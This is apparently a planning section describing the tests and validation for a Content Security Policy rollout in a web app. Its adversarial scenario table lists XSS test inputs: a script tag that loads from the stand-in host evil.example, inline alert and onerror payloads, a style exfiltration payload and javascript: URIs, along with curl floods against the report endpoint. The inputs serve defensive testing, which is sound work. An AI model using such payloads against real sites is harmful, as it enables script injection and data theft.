# 12 — Test and Validation Strategy

Proportional proof per `AGENTS.md`. CSP enforcement is runtime/interaction/data-state
work → **browser proof is mandatory** for each enforcement phase (not skippable).
Report-Only phases need header-presence smoke, not full browser proof.

## 12.1 Test layers used

| Layer | Tool | For |
|---|---|---|
| Unit (pure) | `bunx vitest run <file>` (`test:dom`) | nonce util, policy builder, route-class resolver, report endpoint |
| Proxy unit | `bunx vitest run` invoking `proxy()` with mock `NextRequest` | nonce in headers, CSP content, no-double-header, prefetch skip |
| Route handler unit | `vitest` | `/api/csp-report` contracts |
| DOM | `vitest` + RTL | nonce prop passed to `<Script>` components |
| Browser (mandatory for enforcement) | Playwright (`test:e2e`) | page renders, no CSP violations, 3p scripts load, WebSocket connects |

## 12.2 Test Execution Matrix

| Requirement | Test file path | Test type | Existing/new | Fixture/data setup | Command | Expected evidence | Known pre-existing reds | Owner |
|---|---|---|---|---|---|---|---|---|
| SEC-01 | `tests/vitest/csp-nonce-proxy.test.ts` (new) | proxy unit | new | mock NextRequest | `bunx vitest run tests/vitest/csp-nonce-proxy.test.ts` | x-nonce header set; CSP has `nonce-`; two requests differ | n/a | impl |
| SEC-01 | `tests/vitest/csp-nonce.test.ts` (new) | unit | new | none | `bunx vitest run tests/vitest/csp-nonce.test.ts` | base64, ≥22 chars, unique | n/a | impl |
| SEC-02 | `tests/vitest/csp-inline-script-nonce.test.tsx` (new) | DOM | new | render components | `bunx vitest run tests/vitest/csp-inline-script-nonce.test.tsx` | nonce prop on `<Script>` | n/a | impl |
| SEC-02 | Playwright (P3–P5) | browser | new | real routes | `bunx playwright test csp-enforcement` | framework scripts carry nonce attr | n/a | impl |
| SEC-03/04/05/06/07 | `tests/vitest/csp-policy-builder.test.ts` (new) | unit | new | route-class×env matrix | `bunx vitest run tests/vitest/csp-policy-builder.test.ts` | directive assertions per class/env | n/a | impl |
| SEC-08 | `tests/vitest/csp-report-endpoint.test.ts` (new) | route unit | new | synthetic reports | `bunx vitest run tests/vitest/csp-report-endpoint.test.ts` | 204/200/400/413/429; redaction | n/a | impl |
| SEC-09 | `tests/vitest/csp-nonce-proxy.test.ts` | proxy unit | new | mock | as above | single Content-Security-Policy header | n/a | impl |
| ARCH-02 | `tests/vitest/csp-route-class.test.ts` (new) | unit | new | path table | `bunx vitest run tests/vitest/csp-route-class.test.ts` | correct class per path | n/a | impl |
| ARCH-03 | `tests/vitest/csp-nonce-proxy.test.ts` | proxy unit | new | prefetch headers | as above | prefetch → no nonce | n/a | impl |
| TEST-01 (rewrite) | `tests/vitest/landing-security-headers.test.ts` | proxy unit | rewritten | mock NextRequest | `bunx vitest run tests/vitest/landing-security-headers.test.ts` | source order + Report-Only/enforced per class | n/a | impl |
| TEST-01 (rewrite) | `tests/vitest/project-location-map-csp.test.ts` | proxy unit | rewritten | mock | `bunx vitest run tests/vitest/project-location-map-csp.test.ts` | workshop maps; share none | n/a | impl |
| TEST-01 (rewrite) | `tests/vitest/project-publication-security-headers.test.ts` | proxy unit | rewritten | mock | `bunx vitest run tests/vitest/project-publication-security-headers.test.ts` | share enforced contract | n/a | impl |
| TEST-01 (rewrite) | `tests/vitest/project-publication-security.test.ts` | unit | rewritten | n/a | `bunx vitest run tests/vitest/project-publication-security.test.ts` | P11 real assertions | placeholder `expect(true)` today | impl |
| TEST-01 (rewrite) | `tests/vitest/next-config-workshop-headers.test.ts` | text-scan | rewritten | source text | `bunx vitest run tests/vitest/next-config-workshop-headers.test.ts` | workshop headers present | n/a | impl |
| TEST-01 (verify) | `tests/vitest/cloudflare-web-analytics-integration.test.ts` | text-scan | verify | source text | `bunx vitest run tests/vitest/cloudflare-web-analytics-integration.test.ts` | beacon sources; not on /share | n/a | impl |
| TEST-01 (verify) | `tests/vitest/project-location-privacy-source.test.ts` | text-scan | verify | source text | `bunx vitest run tests/vitest/project-location-privacy-source.test.ts` | maps bounded | n/a | impl |
| TEST-01 (verify) | `tests/vitest/shared-link-header-smoke-script.test.ts` | helper unit | verify | smoke helper | `bunx vitest run tests/vitest/shared-link-header-smoke-script.test.ts` | share headers still pass | n/a | impl |
| TEST-03 (P3) | Playwright `/share`,`/invite` | browser | new | real deploy | `bunx playwright test` | render + no violations + flows | n/a | impl |
| TEST-03 (P4) | Playwright `/workshop` | browser | new | real deploy | `bunx playwright test` | render + Maps + WebSocket + no violations | n/a | impl |
| TEST-03 (P5) | Playwright `/login`, landing | browser | new | real deploy | `bunx playwright test` | OAuth + analytics + no violations | n/a | impl |
| PERF-01 | TTFB probe | manual/hosted | new | 20 reqs/route | `bun run launch:verify-hosted-sensitive-routes` + curl probe | p50/p95 before/after | n/a | impl |

**Full gate:** `bun run validate` (type-check + lint + lint:design-system + lint:design + test + test:dom). Recommended new script `test:csp` bundling the CSP-specific vitest files (DEC-10).

## 12.3 Adversarial scenario matrix (UltraQA-style)

For the implementation (runtime behavior present). Documentation planning task
records why dynamic adversarial QA applies to the **future implementation**, not the
planning task itself.

| ID | User/attacker model | Scenario | Setup | Command/harness | Expected signal | Status |
|---|---|---|---|---|---|---|
| ADV-01 | XSS attacker | inject `<script>alert(1)</script>` into a rendered field | test page | Playwright | blocked + reported under enforced; executed+reported under Report-Only | pending impl |
| ADV-02 | XSS attacker | inject `<script src="https://evil.example/a.js">` | test page | Playwright | blocked (not in allowlist) | pending impl |
| ADV-03 | XSS attacker | inject `<img src=x onerror=alert(1)>` | test page | Playwright | blocked (no unsafe-inline on script-src; no unsafe-hashes) | pending impl |
| ADV-04 | XSS attacker | inject `<style>` exfil payload | test page | Playwright | executes (style-src unsafe-inline accepted, DEC-08); document residual | pending impl |
| ADV-05 | XSS attacker | inject `javascript:` URI | test page | Playwright | blocked | pending impl |
| ADV-06 | Report-flooder | flood `/api/csp-report` | script | curl loop | rate-limited (429) after threshold | pending impl |
| ADV-07 | Report-flooder | oversized body | script | curl | 413 | pending impl |
| ADV-08 | Report-flooder | malformed JSON | script | curl | 400 | pending impl |
| ADV-09 | Info-leak tester | check logs for tokens/cookies in reports | deploy | log scan | none present (redaction) | pending impl |
| ADV-10 | Concurrency | two simultaneous requests | script | 2× curl | two different nonces | pending impl |
| ADV-11 | Stale-cache attacker | request a "static" enforced page twice | deploy | curl | different nonce each (dynamic); no reuse | pending impl |
| ADV-12 | Header-injection | attempt to reflect a permissive CSP via header | deploy | curl custom header | ignored; nonce from server only | pending impl |
| ADV-13 | Trusted-script abuse | a nonced first-party script loads an attacker origin | test | Playwright | blocked by connect-src (no attacker origin) | pending impl |
| ADV-14 | Maps/WebSocket regression | workshop collab under enforcement | deploy | Playwright | WebSocket connects; Maps render | pending impl |
| ADV-15 | OAuth flow | sign-in under enforced CSP | deploy | Playwright | completes; recovery script runs | pending impl |

## 12.4 Validation evidence classes (per `AGENTS.md`)

- **Local static:** `git diff --check`, source map → for policy-string presence.
- **Local automated:** `type-check`, `lint`, `vitest` unit/proxy/DOM/route tests → for
  nonce/policy/endpoint/header contracts.
- **Browser/manual:** Playwright → for enforcement-phase render + no-violation + flow
  proofs (mandatory for P3–P5).
- **Provider-backed:** none required (no provider mutation; `wrangler.jsonc` unchanged).
- **Hosted/production:** TTFB probe against preview deploy (PERF-01); CSP header check
  against deployed route via `launch:verify-hosted-sensitive-routes`.

## 12.5 Skipped/unavailable validation

- No provider proof needed (no provider mutation). State why: CSP is response-header
  work; Cloudflare bindings unchanged.
- No hosted/production proof needed beyond the TTFB probe + header smoke (which are
  against preview, acceptable).
- Residual risk: Workers per-isolate rate-limit caveat on `/api/csp-report` (see `06`
  §6.6) — for first-users volume, per-isolate counting is acceptable; if abuse becomes
  real, upgrade to DO/D1 counter (future task).

## 12.6 Flaky/slow command awareness

- `bun run test:dom` is **serial** (`--maxWorkers=1`, `fileParallelism:false` is
  load-bearing). Do not parallelize. Per-file `bunx vitest run <file>` is faster for
  iteration.
- `bun run validate` is the full gate — run it before claiming a phase complete.
